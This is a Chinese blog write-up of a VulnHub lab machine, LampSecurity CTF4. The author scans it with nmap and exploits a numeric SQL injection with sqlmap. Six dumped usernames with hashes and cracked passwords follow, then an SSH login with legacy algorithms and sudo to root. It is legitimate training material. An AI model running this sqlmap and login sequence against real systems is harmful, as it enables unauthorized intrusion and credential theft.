+++
date = '2026-10-29T18:24:43+08:00'
draft = false
title = '[VulnHub靶机]LampSecurityCTF4渗透记录'
tags = ['渗透','Vulnhub','SQL注入']
+++

## 信息收集

攻击机IP: 192.168.200.146
使用arp-scan获得靶机IP: 192.168.200.167

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]
└─$ sudo arp-scan -l                              
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.167 00:0c:29:e7:f3:71       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.022 seconds (126.61 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 18:27 +0800
Nmap scan report for 192.168.200.167
Host is up (0.00036s latency).
Not shown: 65512 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
631/tcp closed ipp
MAC Address: 00:0C:29:E7:F3:71 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```

进行深度扫描

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]
└─$ sudo nmap -sT -sV -sC -p22,25,80,631 192.168.200.167
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 18:28 +0800
Nmap scan report for 192.168.200.167
Host is up (0.00031s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.200.146], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
| http-robots.txt: 5 disallowed entries 
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-server-header: Apache/2.2.0 (Fedora)
|_http-title:  Prof. Ehks 
631/tcp closed ipp
MAC Address: 00:0C:29:E7:F3:71 (VMware)
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

从扫描结果中可以看到Web服务的robots.txt暴露了`/mail/` `/restricted/` `/conf/` `/sql/` `/admin/`5个路径  
进行漏洞扫描, 发现了一些可能有用的路径

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]                                                                                                       
└─$ nmap --script=vuln -p22,25,80,631 192.168.200.167                                                                                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 18:31 +0800                                                                          
Nmap scan report for 192.168.200.167                                                                                                       
Host is up (0.00030s latency).                                                                                                             
                                                                                                                                           
PORT    STATE  SERVICE                                                                                                                                                 
22/tcp  open   ssh                                                                                                                                                     
25/tcp  open   smtp                                                                                                                                                    
| smtp-vuln-cve2010-4344:                                                                    
|_  The SMTP server is not Exim: NOT VULNERABLE                                                                                                                        
80/tcp  open   http                                                                          
|_http-dombased-xss: Couldn't find any DOM based XSS.                                        
| http-csrf:                                                                                                            
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.200.167                                         
|   Found the following possible CSRF vulnerabilities:                                                                 
|                                                                                                        
|     Path: http://192.168.200.167:80/                                                                   
|     Form id:                                                                               
|     Form action: /index.html?page=search&title=Search Results                              
|                                                                                                        
|     Path: http://192.168.200.167:80/index.html?page=blog&title=Blog                                    
|     Form id:                                                                                          
|     Form action: /index.html?page=search&title=Search Results                                                         
|                                                                                                                       
|     Path: http://192.168.200.167:80/index.html?title=Home Page                                                       
|     Form id:                                                                                           
|     Form action: /index.html?page=search&title=Search Results                                         
|                                                                                                                       
|     Path: http://192.168.200.167:80/index.html?page=research&title=Research                                           
|     Form id:                                                                                                         
|     Form action: /index.html?page=search&title=Search Results                                                         
|                                                                                                                       
|     Path: http://192.168.200.167:80/index.html?page=contact&title=Contact                                            
|     Form id:                                                                      
|     Form action: /index.html?page=search&title=Search Results                                          
|                                                          
|     Path: http://192.168.200.167:80/index.html?page=search&title=Search Results                                       
|     Form id:                                                                                                         
|     Form action: /index.html?page=search&title=Search Results                                                                             
|                                                                                                                                           
|     Path: http://192.168.200.167:80/?page=blog&title=Blog&id=6                                                                            
|     Form id:                                                                                                                              
|     Form action: /index.html?page=search&title=Search Results                                                                             
|                                                                                                                                           
|     Path: http://192.168.200.167:80/?page=blog&title=Blog&id=7      
|     Form id:                                                                                           
|     Form action: /index.html?page=search&title=Search Results       
|                                         
|     Path: http://192.168.200.167:80/?page=blog&title=Blog&id=5      
|     Form id:                            
|     Form action: /index.html?page=search&title=Search Results       
|                                                                                                        
|     Path: http://192.168.200.167:80/?page=blog&title=Blog&id=2                                         
|     Form id:                                                                                           
|_    Form action: /index.html?page=search&title=Search Results                     
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)                                                                                                  
|_http-trace: TRACE is enabled                                                      
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                    
| http-slowloris-check:                                                             
|   VULNERABLE:                                                                     
|   Slowloris DOS attack                                                            
|     State: LIKELY VULNERABLE            
|     IDs:  CVE:CVE-2007-6750                       
|       Slowloris tries to keep many connections to the target web server open and hold                  
|       them open as long as possible.  It accomplishes this by opening connections to                   
|       the target web server and sending a partial request. By doing so, it starves                     
|       the http server's resources causing Denial Of Service.                                           
|                                                                                                        
|     Disclosure date: 2009-09-17                                                                        
|     References:                                                                                        
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                     
|_      http://ha.ckers.org/slowloris/                                                                   
| http-enum:                                        
|   /admin/: Possible admin folder                  
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/admin.php: Possible admin folder                                                              
|   /robots.txt: Robots file                        
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'                     
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'                    
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'                       
|   /pages/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'                     
|   /restricted/: Potentially interesting folder (401 Authorization Required)                            
|   /sql/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'                       
|_  /usage/: Potentially interesting folder
631/tcp closed ipp                                  
MAC Address: 00:0C:29:E7:F3:71 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 143.24 seconds 
```

## 漏洞利用

访问Web服务

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E8%AE%BF%E9%97%AEWeb%E6%9C%8D%E5%8A%A1.avif)

打开Blog页面, 能发现许多帖子

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/Blog%E9%A1%B5%E9%9D%A2.avif)

随便点进一个, 注意到地址栏中出现id参数, 且值为数字, 猜测可能存在数字型SQL注入漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E5%9C%B0%E5%9D%80%E6%A0%8F%E5%87%BA%E7%8E%B0id.avif)

将id的值改为`2 or 1`, 发现显示了全部的帖子, 证明我们的猜测没错

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E5%85%A8%E9%83%A8%E6%98%BE%E7%A4%BA.avif)

使用SQLmap自动化攻击, 发现6个数据库

```shell
sudo sqlmap -u "http://192.168.200.167/index.html?page=blog&title=Blog&id=2" -p id --dbs --batch
```

```text
available databases [6]:
[*] calendar
[*] ehks
[*] information_schema
[*] mysql
[*] roundcubemail
[*] test
```

由于靶机Web网站的标题为"Prof. Ehks Blog", 所以优先查看ehks数据库

```shell
sudo sqlmap -u "http://192.168.200.167/index.html?page=blog&title=Blog&id=2" -p id --dbms mysql -D ehks --tables --batch
```

发现3个表, 其中user表看上去很有趣

```text
Database: ehks
[3 tables]
+---------+
| comment |
| user    |
| blog    |
+---------+
```

让我们看看它有哪些字段

```shell
sudo sqlmap -u "http://192.168.200.167/index.html?page=blog&title=Blog&id=2" -p id --dbms mysql -D ehks -T user --columns --batch
```

发现该表中存在用户名和密码

```text
Database: ehks
Table: user
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| user_id   | int(11)     |
| user_name | varchar(20) |
| user_pass | varchar(32) |
+-----------+-------------+
```

让我们读取该表内容

```shell
sudo sqlmap -u "http://192.168.200.167/index.html?page=blog&title=Blog&id=2" -p id --dbms mysql -D ehks -T user -C "user_id,user_name,user_pass" --dump --batch
```

```text
Database: ehks
Table: user
[6 entries]
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```

现在我们得到了6组凭据, 因为之前Nmap扫描到了`/admin/`页面, 所以我们可以去试试  
访问http://192.168.200.167/admin/

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/admin%E9%A1%B5%E9%9D%A2.avif)

依次使用得到的凭据尝试, 发现每个都能成功, 而且登录后的内容一样

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.avif)

点击Post Blog可以发布新帖子, 尝试写入一句话木马

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E5%B0%9D%E8%AF%95%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC.avif)

然而, 打开帖子发现我们的php代码被注释了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/LampSecurityCTF4/%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%B3%A8%E9%87%8A.avif)

那这些凭据能不能通过ssh登录呢? 尝试使用ssh登录, 发现服务器使用的是旧密钥交换算法, 而攻击机的ssh出于安全考虑禁用了这类交换算法, 导致无法建立连接

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]
└─$ ssh dstevens@192.168.200.167                        
Unable to negotiate with 192.168.200.167 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

使用-oKexAlgorithms参数补上这些交换算法, 再次尝试登录

```shell
ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.200.167 
Unable to negotiate with 192.168.200.167 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

这是因为服务器只支持ssh-rsa和ssh-dss两种主机密钥算法, 而新版ssh为了安全默认禁用了这两种算法, 解决方法是使用-oHostKeyAlgorithms参数加上支持, 再次尝试登录

```shell
┌──(kali㉿kali)-[~/LampSecurityCTF4]
└─$ ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa dstevens@192.168.200.167
The authenticity of host '192.168.200.167 (192.168.200.167)' can't be established.
RSA key fingerprint is: SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.200.167' (RSA) to the list of known hosts.
BSD SSH 4.1
dstevens@192.168.200.167's password:
Last login: Thu Oct 29 06:58:21 2026 from 192.168.200.146
[dstevens@ctf4 ~]$
```

成功以dstevens账户身份登录成功

## 权限提升

使用sudo -l, 发现当前用户能以root权限执行任何命令

```text
[dstevens@ctf4 ~]$ sudo -l
Password:
User dstevens may run the following commands on this host:
    (ALL) ALL
```

直接提权

```shell
[dstevens@ctf4 ~]$ sudo /bin/bash
[root@ctf4 ~]#
```

本靶机无flag文件, 获得root权限即完成
